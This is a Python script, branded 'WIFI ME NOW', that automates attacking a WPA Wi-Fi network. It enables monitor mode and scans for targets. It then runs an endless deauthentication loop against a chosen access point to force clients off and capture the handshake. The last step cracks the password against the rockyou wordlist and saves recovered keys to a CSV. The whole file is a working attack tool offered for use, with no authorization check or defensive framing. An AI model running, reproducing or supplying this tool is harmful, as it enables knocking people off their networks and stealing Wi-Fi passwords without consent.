#!/usr/bin/env python3
import subprocess
import threading
import time
import os
import sys
import csv
from datetime import datetime
from scapy.all import sniff, EAPOL

# Color codes
RESET = "\033[0m"
BOLD = "\033[1m"
GREEN = "\033[92m"
RED = "\033[91m"
BLUE = "\033[94m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
WHITE = "\033[97m"

handshake_found = threading.Event()
eapol_messages = set()
deauth_process = None

def banner():
    os.system("clear")
    print(f"""{BOLD}{GREEN}


  (`\ .-') /`                               _   .-')       ('-.            .-') _                (`\ .-') /`,---.,---.
   `.( OO ),'                              ( '.( OO )_   _(  OO)          ( OO ) )                `.( OO ),'|   ||   |
,--./  .--.  ,-.-')    ,------.,-.-')       ,--.   ,--.)(,------.     ,--./ ,--,'  .-'),-----. ,--./  .--.  |   ||   |
|      |  |  |  |OO)('-| _.---'|  |OO)      |   `.'   |  |  .---'     |   \ |  |\ ( OO'  .-.  '|      |  |  |   ||   |
|  |   |  |, |  |  \(OO|(_\    |  |  \      |         |  |  |         |    \|  | )/   |  | |  ||  |   |  |, |   ||   |
|  |.'.|  |_)|  |(_//  |  '--. |  |(_/      |  |'.'|  | (|  '--.      |  .     |/ \_) |  |\|  ||  |.'.|  |_)|  .'|  .'
|         | ,|  |_.'\_)|  .--',|  |_.'      |  |   |  |  |  .--'      |  |\    |    \ |  | |  ||         |  `--' `--' 
|   ,'.   |(_|  |     \|  |_)(_|  |         |  |   |  |  |  `---.     |  | \   |     `'  '-'  '|   ,'.   |  .--. .--. 
'--'   '--'  `--'      `--'    `--'         `--'   `--'  `------'     `--'  `--'       `-----' '--'   '--'  '--' '--' 


{CYAN}               >>>   WIFI ME NOW | 369 Project   <<<{RESET}
""")


def log(msg, color=RESET):
    print(f"{color}{BOLD}[{time.strftime('%H:%M:%S')}]{RESET} {color}{msg}{RESET}")

def eapol_sniffer(packet):
    if packet.haslayer(EAPOL):
        eapol_messages.add(len(packet))
        log(f"Detected EAPOL frame ({len(eapol_messages)}/4)", YELLOW)
        if len(eapol_messages) >= 2:
            handshake_found.set()

def check_dependency(cmd):
    if subprocess.call(f"which {cmd}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
        log(f"Missing required tool: {cmd}", RED)
        sys.exit(1)

def start_monitor_mode(interface):
    log("Starting monitor mode...", BLUE)
    subprocess.run("sudo airmon-ng check kill", shell=True)
    subprocess.run(f"sudo airmon-ng start {interface}", shell=True)
    return f"{interface}" if not interface.endswith("mon") else interface

def scan_networks(mon_iface):
    log("Scanning for networks (Ctrl+C to stop)...", BLUE)
    try:
        subprocess.run(["sudo", "airodump-ng", mon_iface])
    except KeyboardInterrupt:
        pass

def start_deauth(mon_iface, bssid):
    global deauth_process
    cmd = f"bash -c 'while true; do sudo aireplay-ng --deauth 8 -a {bssid} {mon_iface}; sleep 2; done'"
    deauth_process = subprocess.Popen(["x-terminal-emulator", "-e", cmd])
    log(f"Deauth attack launched in new terminal targeting {bssid}", CYAN)

def stop_deauth():
    global deauth_process
    if deauth_process:
        deauth_process.terminate()
        log("Deauth attack stopped.", GREEN)

def save_result(bssid, password, cap_file):
    os.makedirs("results", exist_ok=True)
    file_path = os.path.join("results", "results.csv")
    exists = os.path.isfile(file_path)

    with open(file_path, mode="a", newline="") as csvfile:
        writer = csv.writer(csvfile)
        if not exists:
            writer.writerow(["Timestamp", "BSSID", "Password", "Capture File"])
        writer.writerow([datetime.now().isoformat(), bssid, password, cap_file])
    log(f"Saved result to {file_path}", GREEN)

def crack_password(cap_path, bssid):
    result = subprocess.run(
        ["aircrack-ng", f"{cap_path}-01.cap", "-w", "/usr/share/wordlists/rockyou.txt"],
        stdout=subprocess.PIPE, text=True
    )
    output = result.stdout
    password = None
    for line in output.splitlines():
        if "KEY FOUND!" in line:
            password = line.split(":")[-1].strip()
            break

    if password:
        log(f"Password found: {password}", GREEN)
        save_result(bssid, password, f"{cap_path}-01.cap")
    else:
        log("Password not found. Try another wordlist.", RED)

def capture_handshake(mon_iface, bssid, channel):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    capname = f"{bssid.replace(':','')}_{timestamp}"
    cap_path = f"captures/{capname}"

    os.makedirs("captures", exist_ok=True)
    log("Launching airodump-ng capture...", BLUE)
    airodump = subprocess.Popen([
        "x-terminal-emulator", "-e",
        "sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", cap_path, mon_iface
    ])

    log("Starting handshake sniffer...", BLUE)
    sniffer_thread = threading.Thread(target=sniff, kwargs={"iface": mon_iface, "prn": eapol_sniffer, "timeout": 60})
    sniffer_thread.start()

    start_deauth(mon_iface, bssid)
    sniffer_thread.join()

    stop_deauth()
    airodump.terminate()
    time.sleep(2)

    if handshake_found.is_set():
        log("Handshake detected!", GREEN)
    else:
        log("No handshake detected. Try again.", RED)
        sys.exit(1)

    final_cap = f"{cap_path}-01.cap"
    log(f"Capture complete. File saved to: {final_cap}", GREEN)

    log("Starting crack attempt with rockyou.txt...", YELLOW)
    crack_password(cap_path, bssid)

    log("Restarting NetworkManager...", BLUE)
    subprocess.run("sudo systemctl restart NetworkManager", shell=True)
    log("Done. Exiting.", GREEN)

if __name__ == "__main__":
    banner()

    for cmd in ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "x-terminal-emulator"]:
        check_dependency(cmd)

    print(f"{CYAN}═════════════════════════════════════════════════{RESET}")
    iface = input(f"{CYAN}[?] Enter wireless interface (e.g., wlan0): {RESET}").strip()
    mon_iface = start_monitor_mode(iface)
    print(f"{CYAN}═════════════════════════════════════════════════{RESET}")
    scan_networks(mon_iface)
    print(f"{CYAN}═════════════════════════════════════════════════{RESET}")
    bssid = input(f"{CYAN}[?] Target BSSID: {RESET}").strip()
    channel = input(f"{CYAN}[?] Channel: {RESET}").strip()
    print(f"{CYAN}═════════════════════════════════════════════════{RESET}")

    capture_handshake(mon_iface, bssid, channel)
